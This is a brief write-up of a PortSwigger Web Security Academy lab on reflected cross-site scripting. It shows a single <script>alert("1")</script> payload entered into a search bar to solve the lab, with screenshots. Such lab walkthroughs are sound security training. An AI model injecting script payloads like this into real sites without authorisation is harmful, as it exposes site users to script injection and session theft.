---
description: >-
  https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
---

# Reflected XSS into HTML context with nothing encoded

<figure><img src="../../../.gitbook/assets/1 (165).png" alt=""><figcaption></figcaption></figure>

Let's enter the following payload into the search bar:

```
<script>alert("1");</script>
```

<figure><img src="../../../.gitbook/assets/2 (147).png" alt=""><figcaption></figcaption></figure>

We have solved the lab

<figure><img src="../../../.gitbook/assets/3 (129).png" alt=""><figcaption></figcaption></figure>
